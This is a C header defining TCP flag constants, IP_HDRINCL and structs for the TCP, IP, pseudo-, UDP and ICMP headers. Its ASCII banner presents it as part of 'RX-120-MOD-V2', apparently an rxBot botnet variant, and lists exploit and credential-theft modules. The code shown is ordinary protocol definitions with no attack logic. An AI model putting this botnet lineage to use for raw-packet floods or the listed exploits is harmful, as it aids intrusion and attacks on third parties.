/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
#ifndef _TCPIP_H_
#define _TCPIP_H_
#define IP_HDRINCL  2 
#define URG 0x20
#define ACK 0x10
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define FIN 0x01
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct tcphdr {

	unsigned short sport;			
	unsigned short dport;			
	unsigned int   seq;				
	unsigned int   ack_seq;		
	unsigned char  lenres;			
	unsigned char  flags;			
	unsigned short window;			
	unsigned short checksum;		
	unsigned short urg_ptr;			

} TCPHEADER;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct tcphdr2 {

	unsigned short source;			
	unsigned short dest;			
	unsigned int   seq;				
	unsigned int   ack_seq;			
	unsigned short res1;
	unsigned short doff;
	unsigned short fin;
	unsigned short syn;
	unsigned short rst;
	unsigned short psh;
	unsigned short ack;
	unsigned short urg;
	unsigned short res2;
	unsigned short window;			
	unsigned short check;		
	unsigned short urg_ptr;		

} TCPHEADER2;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct iphdr {

	unsigned char  verlen;			
	unsigned char  tos;				
	unsigned short total_len;		
	unsigned short ident;			
	unsigned short frag_and_flags;	
	unsigned char  ttl;				
	unsigned char  proto;			
	unsigned short checksum;	
	unsigned int   sourceIP;		
	unsigned int   destIP;		

} IPHEADER;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct pshdr {

	unsigned int   saddr;		
	unsigned int   daddr;		
	unsigned char  zero;			
	unsigned char  proto;		
	unsigned short length;		
	struct tcphdr tcp;				

} PSDHEADER;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct udphdr {

	unsigned short source;		
	unsigned short dest;		
    unsigned short length;			
    unsigned short checksum;	

} UDPHEADER;     
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct icmphdr {

	unsigned char  type;		
    unsigned char  subcode;			
    unsigned short checksum;		
	unsigned short id;			
	unsigned short seq;				

} ICMPHEADER;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#endif
